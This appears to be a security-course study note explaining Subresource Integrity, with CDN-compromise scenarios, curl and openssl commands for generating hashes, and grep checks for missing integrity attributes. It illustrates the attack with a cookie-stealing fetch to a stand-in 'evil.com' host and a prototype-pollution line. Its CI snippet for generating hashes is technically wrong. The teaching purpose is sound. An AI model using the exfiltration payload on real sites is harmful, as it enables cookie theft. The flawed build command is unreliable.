---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.64 Subresource Integrity (SRI) — Integrity Attribute"
---

# 03.64 — Subresource Integrity (SRI)

## What is it?

Subresource Integrity (SRI) is a browser security feature that verifies that resources loaded from third-party sources (CDNs, external scripts) haven't been tampered with. The `integrity` attribute on `<script>` and `<link>` tags contains a cryptographic hash. If the resource's hash doesn't match, the browser refuses to execute it.

---

## How SRI Works

```
WITHOUT SRI:
  <script src="https://cdn.example.com/jquery.js"></script>
  → If cdn.example.com is compromised → malicious jQuery loads!
  → Your users get hacked silently!

WITH SRI:
  <script src="https://cdn.example.com/jquery.js"
          integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
          crossorigin="anonymous">
  </script>
  
  Browser computes SHA-384 of downloaded jquery.js
  If hash MATCHES → execute
  If hash DOESN'T MATCH → block! Error logged!
```

---

## Attack: CDN Compromise Without SRI

```
ATTACK SCENARIO:
  Target app uses: <script src="https://cdn.example.com/utils.js">
  No SRI!
  
  Attacker compromises cdn.example.com OR does DNS poisoning:
  → utils.js now contains:
    [original code]
    fetch('https://evil.com/steal?c=' + document.cookie)
  
  RESULT: All visitors of target app get their cookies stolen!
  
  This happened in reality:
  - British Airways breach (2018): modified third-party script
  - Ticketmaster Magecart attack: CDN script compromised
  - Multiple payment page compromises via third-party code
```

---

## Attack: SRI Absent + Prototype Pollution

```
SCENARIO: App loads lodash from CDN without SRI.
  Attacker poisons CDN → serves malicious lodash with prototype pollution:
  
  Object.prototype.isAdmin = true;
  
  All objects now have .isAdmin = true!
  → Authorization bypass across entire app!
  
  WITH SRI: Hash wouldn't match → lodash blocked → safer!
```

---

## Generating SRI Hashes

```bash
# Generate SHA-384 hash for a file:
curl -s https://cdn.example.com/lib.js | openssl dgst -sha384 -binary | openssl base64 -A
# → output: base64hash

# Full integrity attribute:
echo -n "sha384-" && curl -s https://cdn.example.com/lib.js | openssl dgst -sha384 -binary | openssl base64 -A

# Online: https://www.srihash.org/

# Using sha256:
curl -s https://example.com/lib.js | openssl dgst -sha256 -binary | openssl base64 -A
```

---

## Checking SRI Implementation

```bash
# Check if scripts have integrity attributes:
curl -s https://target.com | grep -i "<script" | grep -c "integrity="
# Count of scripts with SRI vs total scripts

# Find scripts without SRI:
curl -s https://target.com | grep "<script" | grep -v "integrity="

# Check link tags (CSS) for SRI:
curl -s https://target.com | grep "<link" | grep -v "integrity="
```

---

## CSP + SRI Combination

```
require-sri-for in CSP (experimental):
  Content-Security-Policy: require-sri-for script style

This requires ALL scripts and stylesheets to have SRI!
Browser blocks any resource without integrity attribute.

Combined with strict-dynamic in CSP:
  Content-Security-Policy: script-src 'strict-dynamic' 'nonce-xxx'; 
                           require-sri-for script
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Third-party scripts without SRI | Add `integrity` and `crossorigin` to all external scripts |
| CDN compromise → silent XSS | Use SRI + monitoring for CDN resource changes |
| Self-hosted resources | SRI not needed (you control the server) |

**Build tool integration:**
```bash
# webpack sri plugin, or generate during CI:
find . -name "*.js" -exec sha384sum {} \; | sed 's/ /\n/' | \
  awk '{print "sha384-" $0}' | base64
```

---

## Related Notes
- [[34 - Content-Security-Policy]] — CSP require-sri-for
- [[Module 02 - XSS]] — Magecart-style CDN compromise XSS
- [[Module 17 - Recon]] — identifying third-party dependencies
